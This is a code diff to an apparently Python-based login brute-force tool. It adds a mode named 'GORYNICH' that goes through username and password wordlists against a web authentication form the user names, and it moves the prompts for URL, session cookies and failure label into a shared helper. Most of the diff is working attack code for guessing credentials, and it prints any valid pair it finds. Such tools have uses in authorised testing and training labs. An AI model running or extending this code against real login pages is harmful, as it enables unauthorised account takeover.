@@ -81,20 +81,26 @@ def bruteforce_username(username, passwd_list, url, method, inputs, cookies, fai
             return username, password
     return None
 
+def collect_input_parameters(skip_username=False):
+    url = input("# Step 2: Copy and paste URL of a page you're attacking\n")
+    cookies = input(
+        "# Step 3: Type in necessary cookies to access the URL, separated with \';\'. If not present, leave as empty\n"
+        "# ex. security=high; PHPSESSID=9943c85c5c1779e8b78c3fb17f20d513\n"
+        "# To view cookies in Chrome, go Inspect->Application->Cookies\n")
+    fail_label = input("# Step 4: Type in a label or its part that appears when a login is failed\n"
+                       "# ex. Login attempt is unsuccessful, please try again\n")
+    form = find_authentication_form(url, cookies)
+    if not skip_username:
+        username = input("# Step 5: Type username to attack\n")
+        return username, url, cookies, fail_label, form
+    return url, cookies, fail_label, form
+
 
 def run_cmok():
     print_horizontal_delimiter()
     print_cmok_banner()
     print_horizontal_delimiter()
-    username = input("# Step 2: Type username to attack\n")
-    url = input("# Step 3: Copy and paste URL of a page you're attacking\n")
-    cookies = input(
-        "# Step 4: Type in necessary cookies to access the URL, separated with \';\'. If not present, leave as empty\n"
-        "# ex. security=high; PHPSESSID=9943c85c5c1779e8b78c3fb17f20d513\n"
-        "# To view cookies in Chrome, go Inspect->Application->Cookies\n")
-    fail_label = input("# Step 5: Type in a label or its part that appears when a login is failed\n"
-                       "# ex. Login attempt is unsuccessful, please try again\n")
-    form = find_authentication_form(url, cookies)
+    username, url, cookies, fail_label, form = collect_input_parameters(skip_username=False)
     if form:
         print("# Starting CMOK attack!\n"
               "# Using @wpxmlrpcbrute enhanced common password wordlist\n")
@@ -112,7 +118,37 @@ def run_cmok():
         print("# Auth form not detected, exiting...")
 
 
+def bruteforce_usernames(usrnms_list, passwd_list, url, method, inputs, cookies, fail_label):
+    for username in usrnms_list:
+        res_un, res_pass = bruteforce_username(username, passwd_list, url, method, inputs, cookies, fail_label) or (None, None)
+        if res_un and res_pass:
+            return res_un, res_pass
+
+def run_gorinych():
+    print_horizontal_delimiter()
+    print_gorynich_banner()
+    print_horizontal_delimiter()
+    url, cookies, fail_label, form = collect_input_parameters(skip_username=True)
+    if form:
+        print("# Starting GORYNICH attack!\n"
+              "# Using @wpxmlrpcbrute enhanced common password wordlist\n"
+              "# Using @jeanphorn common username wordlist\n")
+        print_gorynich()
+        usrnms_list = read_file_as_list("/wordlists/usernames.txt")
+        passwd_list = read_file_as_list("/wordlists/passwords.txt")
+        action, method, inputs = form
+        res_un, res_pass = bruteforce_usernames(usrnms_list, passwd_list, url, method, inputs, cookies, fail_label) or (None, None)
+        if res_un and res_pass:
+            print(f"# Successful bruteforce, found valid credentials Username "
+                  + colored(res_un, "green") + " - Password " + colored(res_pass, "green"))
+        else:
+            print("# Bruteforce attempt failed, aborting...")
+            quit()
+    else:
+        print("# Auth form not detected, exiting...")
+
+
 if (mode_input == 1):
     run_cmok()
 elif (mode_input == 2):
-    pass
+    run_gorinych()
